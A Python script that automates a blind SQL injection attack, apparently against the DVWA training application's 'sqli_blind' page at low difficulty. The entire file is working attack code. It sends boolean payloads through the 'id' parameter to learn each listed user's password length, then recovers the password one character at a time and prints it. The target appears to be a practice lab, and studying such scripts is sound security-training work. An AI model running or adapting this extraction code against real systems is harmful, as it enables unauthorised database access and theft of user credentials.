#!/usr/bin/env python3

import requests
import urllib3
from bs4 import BeautifulSoup

from util import http_get
from conf import BASE_URL, USERS, ALPHABET

URL = BASE_URL + "/vulnerabilities/sqli_blind/"    
DIFFICULTY = "low"

# -----------------------

def sqli_blind_low():
    global URL, USERS
    
    for user in USERS:
        password_length = get_password_length(URL, user)
        print(f"[INFO] - Password for username: {user} has {password_length} length")
        password = get_password(URL, user, password_length)

# -----

def sql2bool(url, sql_payload):
    global DIFFICULTY    
    params = { "id": sql_payload, "Submit": "Submit" }
    r = http_get(url, DIFFICULTY, params=params)
    return "exists" in r.text
        
# -----
        
def get_password_length(url, username):
    global DIFFICULTY    
    MAX_LENGTH = 1024
    for i in range(1, MAX_LENGTH):
        sql_payload = f"1' AND (select 'x' from users where first_name='{username}' and LENGTH(password) > {i})='x' #"
        if not sql2bool(url, sql_payload):
            return i

# -----

def get_password(url, username, password_length):
    global DIFFICULTY, ALPHABET
    print(f"[INFO] - Password for {username} is ", end="")    
    password = ""    
    for i in range(1, password_length+1):
        for c in ALPHABET:
            sql_payload = f"1' AND (select substring(password, {i}, 1) from users where first_name='{username}')='{c}' #"
            if sql2bool(url, sql_payload):
                password += c
                print(c, end="", flush=True) # to print in a cool way
                break            
    print("\n", end="")
    return password
        
